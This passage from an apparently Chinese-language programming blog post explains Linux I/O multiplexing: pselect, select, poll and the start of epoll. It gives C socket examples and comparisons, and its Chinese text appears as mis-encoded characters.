æ“ä½œï¼Œå…è®¸æ›´å®‰å…¨çš„è°ƒç”¨select</p></li><li><p>ä¸select()çš„åŒºåˆ«ï¼š</p><p>(1) è¶…æ—¶å‚æ•°çš„ç»“æ„ä½“ä¸ä¸€æ ·ï¼šåœ¨<code>select()</code>ä¸­æ˜¯<code>struct timeval</code>ï¼ˆç§’+æ¯«ç§’ï¼‰ï¼Œè€Œåœ¨<code>pselect()</code>ä¸­æ˜¯<code>struct timespec</code>ï¼ˆç§’+çº³ç§’ï¼‰</p><p>(2) æ˜¯å¦ä¿®æ”¹timeoutå€¼ï¼š<code>select()</code>å¯èƒ½ä¼šå°†timeoutå€¼æ›´æ–°ä¸ºè¿˜å‰©ä¸‹çš„æ—¶é—´ï¼Œè€Œ<code>pselect()</code>åˆ™ä¸ä¼šä¿®æ”¹</p><p>(3) sigmaskå‚æ•°</p></li><li><p>ä¸select()ä¹‹é—´çš„ç­‰ä»·è¡¨è¿°ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">ready = pselect(nfds, &amp;readfds, &amp;writefds, &amp;exceptfds,<br>                           timeout, &amp;sigmask);<br><span class="hljs-comment">// Same as ---|:</span><br><span class="hljs-comment">//            v</span><br><span class="hljs-type">sigset_t</span> origmask;<br><br>pthread_sigmask(SIG_SETMASK, &amp;sigmask, &amp;origmask);<br>ready = select(nfds, &amp;readfds, &amp;writefds, &amp;exceptfds, timeout);<br>pthread_sigmask(SIG_SETMASK, &amp;origmask, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></tbody></table></figure></li></ul></li><li><p><span class="github-emoji"><span>ğŸŒ°</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>[2]</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXBUF 256</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">child_process</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>{<br>  sleep(<span class="hljs-number">2</span>); <span class="hljs-comment">// make sure that server is started</span><br>  <span class="hljs-type">char</span> msg[MAXBUF];<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">addr</span> =</span> {<span class="hljs-number">0</span>};<br>  <span class="hljs-type">int</span> n, sockfd, num=<span class="hljs-number">1</span>;<br>  srandom(getpid());<br>  <span class="hljs-comment">/* Create socket and connect to server */</span><br>  sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>  addr.sin_family = AF_INET;<br>  addr.sin_port = htons(<span class="hljs-number">2000</span>);<br>  addr.sin_addr.s_addr = inet_addr(<span class="hljs-string">"127.0.0.1"</span>);<br><br>  connect(sockfd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;addr, <span class="hljs-keyword">sizeof</span>(addr));<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"child {%d} connected \n"</span>, getpid());<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){  <span class="hljs-comment">// dead loop</span><br>        <span class="hljs-type">int</span> sl = (random() % <span class="hljs-number">10</span>) +  <span class="hljs-number">1</span>;<br>        num++;<br>     sleep(sl);<br>  <span class="hljs-built_in">sprintf</span> (msg, <span class="hljs-string">"Test message %d from client %d"</span>, num, getpid());<br>  n = write(sockfd, msg, <span class="hljs-built_in">strlen</span>(msg));<span class="hljs-comment">/* Send message */</span><br>  }<br><br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">char</span> buffer[MAXBUF];<br>  <span class="hljs-type">int</span> fds[<span class="hljs-number">5</span>];<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">addr</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">client</span>;</span><br>  <span class="hljs-type">int</span> addrlen, n,i,max=<span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> sockfd, commfd;<br>  fd_set rset;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>  {<br>  <span class="hljs-keyword">if</span>(fork() == <span class="hljs-number">0</span>)<br>  {<br>  child_process();<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  }<br>  }<br><br>  sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">memset</span>(&amp;addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (addr));<br>  addr.sin_family = AF_INET;<br>  addr.sin_port = htons(<span class="hljs-number">2000</span>);<br>  addr.sin_addr.s_addr = INADDR_ANY;<br>  bind(sockfd,(<span class="hljs-keyword">struct</span> sockaddr*)&amp;addr, <span class="hljs-keyword">sizeof</span>(addr));<br>  listen (sockfd, <span class="hljs-number">5</span>); <br><br>  <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) <br>  {<br>    <span class="hljs-built_in">memset</span>(&amp;client, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (client));<br>    addrlen = <span class="hljs-keyword">sizeof</span>(client);<br>    fds[i] = accept(sockfd,(<span class="hljs-keyword">struct</span> sockaddr*)&amp;client, &amp;addrlen);<br>    <span class="hljs-keyword">if</span>(fds[i] &gt; max)<br>    max = fds[i];<br>  }<br>  <br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){<br>FD_ZERO(&amp;rset);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">5</span>; i++ ) {<br>  FD_SET(fds[i],&amp;rset);<br>  }<br><br>   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"round again"</span>);<br>select(max+<span class="hljs-number">1</span>, &amp;rset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) {<br><span class="hljs-keyword">if</span> (FD_ISSET(fds[i], &amp;rset)){ <span class="hljs-comment">// å¦‚æœæ–‡ä»¶æè¿°ç¬¦åœ¨è¿™ä¸ªé›†åˆé‡Œï¼Œæ„å‘³ç€è¯¥æ–‡ä»¶æè¿°ç¬¦å¯è¯»</span><br><span class="hljs-built_in">memset</span>(buffer,<span class="hljs-number">0</span>,MAXBUF);<br>read(fds[i], buffer, MAXBUF);<br><span class="hljs-built_in">puts</span>(buffer);<br>}<br>}<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure></li><li><p><span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> è¿™é‡Œä¸ºä»€ä¹ˆéœ€è¦ä¼ å…¥nfdså¹¶å‘Šè¯‰<code>select()</code>å½“å‰æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦ä¸­æœ€å¤§å€¼+1ï¼Ÿ</p><p><strong>A:</strong> ä¸fd_setçš„å®ç°æœ‰å…³ï¼šæ¯ä¸ªfdè¡¨ç¤ºä¸ºä¸€ä¸ªæ¯”ç‰¹ï¼Œfd_setæ˜¯ä¸€ä¸ª32ä¸ªæ•´æ•°çš„æ•°ç»„ï¼Œå…±1024æ¯”ç‰¹ï¼›æˆ‘ä»¬è¿›ä¸€æ­¥å‡è®¾æœ‰5ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œä½†æœ€é«˜çš„æ–‡ä»¶æè¿°ç¬¦å€¼æ˜¯900ï¼Œé‚£ä¹ˆå‡½æ•°å°†ä¼šæ£€æŸ¥ä»0åˆ°900çš„æ¯”ç‰¹è€Œä¸éœ€è¦æ£€æŸ¥åˆ°1024</p></li></ul><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><ul><li>åœ¨æ¯ä¸€æ¬¡è°ƒç”¨ä¹‹å‰ï¼Œéœ€è¦æ„é€ æ¯ä¸€ä¸ªé›†åˆï¼ˆä¸‰ä¸ªé›†åˆï¼‰</li><li>å‡½æ•°é€ä½æ£€æŸ¥åˆ°æœ€å¤§æ–‡ä»¶æè¿°ç¬¦å€¼ - å¤æ‚åº¦ï¼šO(n)</li><li>éœ€è¦åœ¨selectè°ƒç”¨ä¹‹åæ£€æŸ¥æ–‡ä»¶æè¿°ç¬¦æ˜¯å¦åœ¨selectè¿”å›çš„é›†åˆä¸­ï¼Œå¦‚æœåœ¨ï¼Œåˆ™è¿›è¡Œç›¸åº”çš„å¤„ç†</li><li>selectæœ€å¤šåªèƒ½ç›‘å¬1024ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆåº•å±‚ä½¿ç”¨BitsMapå®ç°ï¼‰</li></ul><h2 id="E2ï¼šPollç³»ç»Ÿè°ƒç”¨"><a href="#E2ï¼šPollç³»ç»Ÿè°ƒç”¨" class="headerlink" title="E2ï¼šPollç³»ç»Ÿè°ƒç”¨"></a>E2ï¼šPollç³»ç»Ÿè°ƒç”¨</h2><ul><li><p>å‡½æ•°ç­¾å[5]ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">poll</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> pollfd *fds,</span><br><span class="hljs-params">    <span class="hljs-type">nfds_t</span> nfds,<span class="hljs-comment">// fdsæ•°ç»„å…ƒç´ ä¸ªæ•°ï¼ï¼ˆæ³¨æ„è¿™é‡Œä¸select()å‡½æ•°çš„åŒºåˆ«ï¼‰</span></span><br><span class="hljs-params">    <span class="hljs-type">int</span> timeout</span><br><span class="hljs-params">)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">ppoll</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> pollfd *fds, <span class="hljs-type">nfds_t</span> nfds,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *_Nullable tmo_p,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *_Nullable sigmask</span><br><span class="hljs-params">)</span>;<br><span class="hljs-comment">/* struct pollfd */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> {</span><br>    <span class="hljs-type">int</span>   fd;         <span class="hljs-comment">/* file descriptor */</span><br>    <span class="hljs-type">short</span> events;     <span class="hljs-comment">/* requested events */</span><br>    <span class="hljs-type">short</span> revents;    <span class="hljs-comment">/* returned events */</span><br>};<br><br></code></pre></td></tr></tbody></table></figure></li><li><p><code>poll()</code>è°ƒç”¨é˜»å¡æ¥è§¦é€»è¾‘ä¸<code>select()</code>ä¸€æ ·</p></li><li><p>åœ¨eventså’Œreventsï¼ˆpoll.hï¼‰ä¸­å®šä¹‰çš„æ¯”ç‰¹ï¼š</p><ul><li><strong>POLLIN</strong>ï¼šæœ‰æ•°æ®è¦è¯»</li><li><strong>POLLPRI</strong>ï¼šæ–‡ä»¶æè¿°ç¬¦å­˜åœ¨ä¸€äº›å¼‚å¸¸ï¼Œå¯èƒ½åŒ…æ‹¬ï¼šTCP socketä¸­æœ‰å¸¦å¤–æ•°æ®ç­‰</li><li><strong>POLLOUT</strong>ï¼šå¯å†™</li><li><strong>POLLRDHUP</strong>ï¼šæµsocketå…³é—­è¿æ¥ or è¿æ¥é€”ä¸­å…³é—­å†™æ“ä½œ</li><li><strong>POLLERR</strong>ï¼šé”™è¯¯æ¡ä»¶ *</li><li><strong>POLLHUP</strong>ï¼šæŒ‚èµ· *</li><li><strong>POLLNVAL</strong>ï¼šæ— æ•ˆè¯·æ±‚ï¼Œfdæœªæ‰“å¼€ *</li></ul><p>ps: * è¡¨ç¤ºåªä¼šå‡ºç°åœ¨reventsä¸­</p></li><li><p><span class="github-emoji"><span>ğŸŒ°</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å°†ä¸Šè¿°<code>select()</code>ç¤ºä¾‹ä»£ç è¿›è¡Œç›¸åº”çš„ä¿®æ”¹</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br>...<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfds[<span class="hljs-number">5</span>];<br>    ...<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) <br>    {<br>        <span class="hljs-built_in">memset</span>(&amp;client, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span> (client));<br>        addrlen = <span class="hljs-built_in">sizeof</span>(client);<br>        pollfds[i].fd = <span class="hljs-built_in">accept</span>(sockfd,(<span class="hljs-keyword">struct</span> sockaddr*)&amp;client, &amp;addrlen);<br>        pollfds[i].events = POLLIN;<br>    }<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"round again"</span>);<br>        <span class="hljs-built_in">poll</span>(pollfds, <span class="hljs-number">5</span>, <span class="hljs-number">50000</span>);<br><br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) {<br>            <span class="hljs-keyword">if</span> (pollfds[i].revents &amp; POLLIN){<br>                pollfds[i].revents = <span class="hljs-number">0</span>;<br>                <span class="hljs-built_in">memset</span>(buffer,<span class="hljs-number">0</span>,MAXBUF);<br>                <span class="hljs-built_in">read</span>(pollfds[i].fd, buffer, MAXBUF);<br>                <span class="hljs-built_in">puts</span>(buffer);<br>            }<br>        }<br>    }<br>    ...<br></code></pre></td></tr></tbody></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/2023/07/10/%E5%85%B3%E4%BA%8ELinux%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E9%82%A3%E4%BA%9B%E4%BA%8B/1.png"></p></li></ul><h3 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>**poll() <span class="github-emoji"><span>ğŸ†š</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f19a.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> select(): **</p><ul><li><p><code>poll()</code>ä¸éœ€è¦ä½¿ç”¨è€…è®¡ç®—æœ€å¤§æ–‡ä»¶æè¿°ç¬¦å€¼+1çš„å€¼ã€‚</p></li><li><p><code>poll()</code>å¯¹äºå¤§æ•°å€¼çš„æ–‡ä»¶æè¿°ç¬¦æ¥è¯´æ›´æœ‰æ•ˆã€‚ä»ç„¶å‡è®¾æœ€å¤§å€¼ä¸º900çš„äº”ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œ<code>poll()</code>ä»…éœ€éå†5æ¬¡ï¼Œè€Œä½¿ç”¨<code>select()</code>åˆ™éœ€è¦éå†900æ¬¡</p></li><li><p><code>select()</code>çš„æ–‡ä»¶æè¿°ç¬¦é›†åˆæ˜¯å®šé•¿çš„ï¼ˆ1024ï¼‰</p></li><li><p>åœ¨<code>select()</code>ä¸­ï¼Œæ–‡ä»¶æè¿°ç¬¦é›†åˆåœ¨è¿”å›æ—¶é‡æ–°æ„å»ºï¼Œå› æ­¤éšåæ¯ä¸€æ¬¡è°ƒç”¨æ—¶éƒ½éœ€è¦é‡æ–°åˆå§‹åŒ–ä»–ä»¬ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){<br>FD_ZERO(&amp;rset);<br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">5</span>; i++ ) {<br> FD_SET(fds[i],&amp;rset);   <span class="hljs-comment">// &lt;================= é‡æ–°åˆå§‹åŒ–ï¼</span><br> }<br>  <br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"round again"</span>);<br>select(max+<span class="hljs-number">1</span>, &amp;rset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>  <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) {<br><span class="hljs-keyword">if</span> (FD_ISSET(fds[i], &amp;rset)){ <span class="hljs-comment">// å¦‚æœæ–‡ä»¶æè¿°ç¬¦åœ¨è¿™ä¸ªé›†åˆé‡Œï¼Œæ„å‘³ç€è¯¥æ–‡ä»¶æè¿°ç¬¦å¯è¯»</span><br><span class="hljs-built_in">memset</span>(buffer,<span class="hljs-number">0</span>,MAXBUF);<br>read(fds[i], buffer, MAXBUF);<br><span class="hljs-built_in">puts</span>(buffer);<br>}<br>}<br> }<br></code></pre></td></tr></tbody></table></figure><p>è€Œ<code>poll()</code>å°†è¾“å…¥ï¼ˆeventså­—æ®µï¼‰å’Œè¾“å‡ºï¼ˆreventså­—æ®µï¼‰åˆ†éš”å¼€ï¼Œå…è®¸æ•°ç»„é‡æ–°ä½¿ç”¨ï¼ˆè¿™é‡Œå¯ä»¥ç†è§£ä¸º<strong>ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å¼</strong>ï¼‰ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"round again"</span>);<br>    poll(pollfds, <span class="hljs-number">5</span>, <span class="hljs-number">50000</span>);  <span class="hljs-comment">// &lt;================== ç”Ÿäº§revent</span><br>  <br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) {<br>        <span class="hljs-keyword">if</span> (pollfds[i].revents &amp; POLLIN){<br>            pollfds[i].revents = <span class="hljs-number">0</span>;        <span class="hljs-comment">// &lt;================= æ¶ˆè´¹äº†ï¼Œæ¸…ç©ºrevent</span><br>            <span class="hljs-built_in">memset</span>(buffer,<span class="hljs-number">0</span>,MAXBUF);<br>            read(pollfds[i].fd, buffer, MAXBUF);<br>            <span class="hljs-built_in">puts</span>(buffer);<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure></li><li><p><code>select()</code>æ›´åŠ å…·æœ‰å¯ç§»æ¤æ€§ï¼Œå› ä¸ºæŸäº›Unixç³»ç»Ÿä¸æ”¯æŒ<code>poll()</code></p></li></ul><p><span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å†æ·±å…¥æ€è€ƒä¸€ä¸‹ï¼Œ<code>select()</code>å’Œ<code>poll()</code>æœ€æœ¬è´¨çš„åŒºåˆ«å…¶å®æ˜¯æ•°æ®ç»“æ„ä¸Šçš„è°ƒæ•´ï¼Œ<code>select()</code>ä½¿ç”¨äº†<strong>ä¸‰ä¸ªæ•°ç»„æ¥åˆ†åˆ«ç»´æŠ¤</strong>è¯»æè¿°ç¬¦ã€å†™æè¿°ç¬¦å’Œå¼‚å¸¸å¤„ç†æè¿°ç¬¦ï¼Œè€Œ<code>poll()</code>ä»…ä½¿ç”¨äº†<strong>ä¸€ä¸ªæ•°ç»„æ¥ç»´æŠ¤æ–‡ä»¶æè¿°ç¬¦</strong>ï¼Œä½†æ˜¯ä½¿ç”¨äº†è‡ªå®šä¹‰çš„ä¸€ä¸ªåä¸ºpollfdsçš„ç»“æ„ä½“å­˜å‚¨æ–‡ä»¶æè¿°ç¬¦ä¿¡æ¯ï¼Œè€Œ<strong>è¯¥ç»“æ„ä½“ä¸­çš„eventå­—æ®µæè¿°äº†æ–‡ä»¶æè¿°ç¬¦çš„ç±»å‹</strong>ã€‚</p><h2 id="E3-Epollç³»ç»Ÿè°ƒç”¨"><a href="#E3-Epollç³»ç»Ÿè°ƒç”¨" class="headerlink" title="E3: Epollç³»ç»Ÿè°ƒç”¨"></a>E3: Epollç³»ç»Ÿè°ƒç”¨</h2><ul><li><p>å‡½æ•°ç­¾å[7-9]ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/epoll.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_create</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_create1</span><span class="hljs-params">(<span class="hljs-type">int</span> flags)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_ctl</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-type">int</span> op, <span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> epoll_event *_Nullable event)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_wait</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event *events, <span class="hljs-type">int</span> maxevents, <span class="hljs-type">int</span> timeout)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_pwait</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event *events, <span class="hljs-type">int</span> maxevents, <span class="hljs-type">int</span> timeout, <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *_Nullable sigmask)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_pwait2</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event *events, <span class="hljs-type">int</span> maxevents, </span><br><span class="hljs-params">                 <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *_Nullable timeout, <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *_Nullable sigmask)</span>;<br><br><span class="hljs-comment">// event structure</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> {</span><br>     <span class="hljs-type">uint32_t</span>      events;  <span class="hljs-comment">/* Epoll events */</span><br>     <span class="hljs-type">epoll_data_t</span>  data;    <span class="hljs-comment">/* User data variable */</span><br>};<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">epoll_data</span> {</span><br>     <span class="hljs-type">void</span>     *ptr;<br>     <span class="hljs-type">int</span>       fd;<br>     <span class="hljs-type">uint32_t</span>  u32;<br>     <span class="hljs-type">uint64_t</span>  u64;<br>};<br></code></pre></td></tr></tbody></table></figure></li><li><p>epoll APIæ ¸å¿ƒæ¦‚å¿µæ˜¯epollå®ä¾‹ï¼Œå…¶æ˜¯ä¸€ä¸ªå†…æ ¸æ•°æ®ç»“æ„ï¼Œä»ç”¨æˆ·ç©ºé—´çš„è§’åº¦æ¥çœ‹ï¼Œå®ƒå¯ä»¥è¢«çœ‹åšæ˜¯<strong>ä¸¤ä¸ªåˆ—è¡¨</strong>çš„å®¹å™¨[6]ï¼š</p><ul><li>interest listï¼ˆæœ‰æ—¶ä¹Ÿè¢«ç§°ä½œepoll 